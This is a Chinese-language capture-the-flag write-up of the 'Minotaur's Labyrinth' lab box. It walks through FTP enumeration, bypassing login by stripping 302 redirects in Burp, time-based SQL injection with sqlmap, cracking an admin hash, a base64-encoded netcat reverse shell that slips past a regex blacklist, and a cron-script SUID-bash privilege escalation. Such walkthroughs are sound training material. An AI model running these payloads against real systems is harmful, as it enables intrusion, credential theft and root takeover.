# Minotaur's Labyrinth

嗨，是我，代达罗斯，迷宫的创造者。我能够 实现一些后门，但牛头怪能够（部分）修复它们 （这是一个秘密，所以不要告诉任何人）。但是让我们回到你的任务，扎根这台机器，给牛头怪一个教训。

---

**注意，如果您也正在做这道题，那么建议不要跟着我的思路来做，因为会走很多弯路和出很多问题，但是您可以看看我是如何从弯路又兜回来，并且发现一些有意思的东西的**

## 端口扫描

循例 nmap 扫：

    PORT     STATE SERVICE
    21/tcp   open  ftp
    80/tcp   open  http
    443/tcp  open  https
    3306/tcp open  mysql

## ftp枚举

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ftp anonymous@10.10.195.127

有一个message文件

    ftp> ls
    229 Entering Extended Passive Mode (|||1406|)
    150 Opening ASCII mode data connection for file list
    drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
    226 Transfer complete
    ftp> ls ./pub
    229 Entering Extended Passive Mode (|||40538|)
    150 Opening ASCII mode data connection for file list
    -rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
    226 Transfer complete

该文件内容：

    Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
    -- Minotaur

可能遗漏了些什么

    ftp> ls -la
    229 Entering Extended Passive Mode (|||6710|)
    150 Opening ASCII mode data connection for file list
    drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 .
    drwxr-xr-x   3 root     root         4096 Jun 15  2021 ..
    drwxr-xr-x   2 root     root         4096 Jun 15  2021 .secret
    -rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
    226 Transfer complete

./.secret文件夹：

    ftp> ls -la
    229 Entering Extended Passive Mode (|||16813|)
    150 Opening ASCII mode data connection for file list
    drwxr-xr-x   2 root     root         4096 Jun 15  2021 .
    drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 ..
    -rw-r--r--   1 root     root           30 Jun 15  2021 flag.txt
    -rw-r--r--   1 root     root          114 Jun 15  2021 keep_in_mind.txt

flag.txt是flag1

keep_in_mind.txt:

    Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
    -- Minotaur

## Web枚举

进web一看，又是登录页面

gobuster扫，报错：

    Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.195.127/145874a6-07ba-4abc-8b0e-733d3263810c => 302 (Length: 3562). To continue please exclude the status code or the length

我发现如果进入一个不存在的页面，始终会302跳转到login页面

使用-b选项将Negative Status codes改302

    ┌──(root🐦kali)-[/home/sugobet]
    └─# gobuster dir --url http://10.10.195.127/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -b 302

login页面的“Click here for root flag”：

    是两哥们的推特

gobuster扫描结果：

    /api                  (Status: 301) [Size: 233] [--> http://10.10.195.127/api/]
    /cgi-bin/             (Status: 403) [Size: 1035]
    /css                  (Status: 301) [Size: 233] [--> http://10.10.195.127/css/]
    /imgs                 (Status: 301) [Size: 234] [--> http://10.10.195.127/imgs/]
    /js                   (Status: 301) [Size: 232] [--> http://10.10.195.127/js/]
    /logs                 (Status: 301) [Size: 234] [--> http://10.10.195.127/logs/]
    /phpmyadmin           (Status: 403) [Size: 1190]

/api下是一些增删查改的php文件

/logs下有一个post文件夹，里面有一个日志文件：

    POST /minotaur/minotaur-box/login.php HTTP/1.1
    ...

    email=Daedalus&password=g2e5*******5r

看到有明文的用户名和密码，注意请求的路径是：

    /minotaur/minotaur-box/login.php

我们在浏览器中直接打开，然后使用burp改包

get改post，将

    email=Daedalus&password=g2e5*******5r

添加进去，然后放行，发现有登录成功的响应

但是发现每个相应都是302重定向：

    Location: login.html

导致浏览器一直无限重定向到login.html

## burp登场

一开始我尝试拦截响应，并删除location字段，

万万没想到它是每一个请求，得到的响应都是302跳转

现在我们可以通过burp的“匹配和过滤”功能来自动的帮助我们删除所有响应的location字段

    Proxy -> Options -> Match And Replace

    新增 -> 类型选择response header
    match 写入内容： ^Location.*$
    剩下的可以不用填

    然后勾选Regex match，点OK

启用这条rule

接下来的每一个响应，burp将自动为我们删除location字段

此时再次访问：

    http://10.10.195.127/minotaur/minotaur-box/login.html

成功显示页面

## SQL Injection

进到后台有一个查询框，但是无法正常使用，查看源代码，发现userlvl.js，还记得根目录下的js目录吗，在这里

    http://10.10.195.127/js/userlvl.js

    <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->

userlvl.js关键代码：

    if(table_input == "people"){
        // console.log("PEOPLE")
        $.ajax({
            url: `api/${table_input}/search`,
            type: 'POST',
            dataType: "json",
            data: { "namePeople": `${name_input}` },

    } else if (table_input == "creatures") {
    // console.log("CREATURES")
    
    $.ajax({
        url: `api/${table_input}/search`,
        type: 'POST',
        dataType: "json",
        data: { "nameCreature": `${name_input}` },

我们可以很轻松通过burp来伪造请求

首先在浏览器访问：

    http://10.10.195.127/api/people/search

然后burp抓包改包，get改post，按照上面代码来操作

    POST /api/creatures/search HTTP/1.1
    nameCreature=1' or sleep(3);--

成功延迟，存在sql注入

在burp将请求保存成文件

使用sqlmap -r 识别该文件并进行sql注入

    ┌──(root🐦kali)-[/home/sugobet]
    └─# sqlmap -r ./req --dbs

    available databases [6]:
    [*] information_schema
    [*] labyrinth
    [*] mysql
    [*] performance_schema
    [*] phpmyadmin
    [*] test

然后常规操作：

    sqlmap -r ./req -D labyrinth --tables
    sqlmap -r ./req -D labyrinth -T people --columns --dump

## 密码爆破

发现admin的账号和疑似md5加密的密码

    | 5        | M!n0taur     | 1765db94********09ee81fbda4 | admin            |

使用hashcat尝试一下：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# hashcat -a 0 -m 0 '1765db9457f496a39859209ee81fbda4' /usr/share/wordlists/rockyou.txt
    hashcat (v6.2.6) starting

    1765db94*********09ee81fbda4:ami*****uro

爆出来了，前几道题都爆不出来，害我数据库一顿找

## 难道，我错了吗？

到这里又卡住了，因为我发现前面的登录都是白瞎，后台甚至不用登录都能访问，js未被正常加载

这些问题在开头就引起我的注意了，但我没有去理会，现在我尝试登录管理员账号，登录结果与之前的一样，我知道，麻烦来了

最后我没办法，根本不知道这靶机怎么个回事，只好看wp了

    http://10.10.195.127/echo.php?search=

这里可以执行命令

**早知道在前面使用gobuster根目录的时候加上 -x php 了**

## 对与错，不是绝对的 - 峰回路转

**虽然我前面所作的一切貌似都有问题，但是这也让我意外的发现**

**只要我们使用burp禁止302跳转，我们就可以越权访问任何页面！！！**

为什么这么说，因为当我关掉burp抓包之后，我发现echo.php跳转到了login.html

**但是神奇的是，echo.php的页面内容已经包含在了响应当中，只要我们禁止302跳转，浏览器即可正常解析渲染出来该页面内容**

这也就是为什么之前我能够进入后台，其实我之前压根没登录成功，只是因为我禁止了302跳转

## Reverse shell

好，我们继续使用我刚刚的方法禁止302跳转

继续越权访问echo.php

    You really think this is gonna be possible i fixed this @Deadalus -_- !!!? 

有黑名单

题目有提示：

    this is the regex used: /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/

将payload进行base64:

    echo 'mkfifo /tmp/f1;nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1;' | base64

这里要把等号删掉，因为已经过滤了等号

    payload:| echo <b64 code> | base64 -d | bash

开启nc监听

成功getshell

    daemon@labyrinth:/opt/lampp/htdocs$ id    
    id
    uid=1(daemon) gid=1(daemon) groups=1(daemon)

user.txt:

    daemon@labyrinth:/opt/lampp/htdocs$ cat /home/user/flag.txt
    cat /home/user/flag.txt
    fla9{5upe********laG}

## 寻找缺失的flag2

在网站根目录一顿看，最终跟踪到index.php发现了flag2:

    echo "<li class='nav-item'>
        <a class='nav-link' href=''>fla6{7H@T*********149}</a>

## 权限提升

在根目录下发现了：

    daemon@labyrinth:/timers$ ls -la
    ls -la
    total 12
    drwxrwxrwx  2 root root 4096 jún   15  2021 .
    drwxr-xr-x 26 root root 4096 nov    9  2021 ..
    -rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh

这对应上了在开头ftp获得的那些信息

timer.sh:

    #!/bin/bash
    echo "dont fo...forge...ttt" >> /reminders/dontforget.txt

再看看dontforget.txt:

    daemon@labyrinth:/timers$ ls -la /reminders/dontforget.txt
    ls -la /reminders/dontforget.txt
    -rw-r--r-- 1 root root 41628 jan   16 10:24 /reminders/dontforget.txt
    daemon@labyrinth:/timers$ cat /reminders/dontforget.txt
    cat /reminders/dontforget.txt
    dont fo...forge...ttt
    dont fo...forge...ttt
    dont fo...forge...ttt
    ......

刷了一大堆，并且还看到txt一直在被修改，那么很明显，timer.sh是定时任务

我们有权修改，以此获得带suid的bash：

    daemon@labyrinth:/timers$ echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" >> ./timer.sh

/tmp/bash

    daemon@labyrinth:/timers$ ls -la /tmp/bash
    ls -la /tmp/bash
    -rwsr-sr-x 1 root root 1113504 jan   16 10:29 /tmp/bash
    daemon@labyrinth:/timers$ /tmp/bash -p 
    /tmp/bash -p
    bash-4.4# id
    id
    uid=1(daemon) gid=1(daemon) euid=0(root) egid=0(root) groups=0(root),1(daemon)

成功getroot

root.txt:

    bash-4.4# cat /root/da_king_flek.txt 
    cat /root/da_king_flek.txt
    fL4G{YoU_*******9ra7$}

## 补充

对于echo.php，我在想如何找到它，因为gobuster可能无法扫的出来又或者非常麻烦，因为非管理员访问echo.php会302跳转走。其实我们可以使用python，requests禁止重定向，然后判断截获所有302的响应，判断响应体的length是否大于0，也就是判断响应体是否有数据，有数据，那么大概率该页面是存在的，这样我们就可以在未登录的情况下扫描到类似echo.php的页面文件了

事后我还去多了解了一下302重定向，大致跟这里差不多
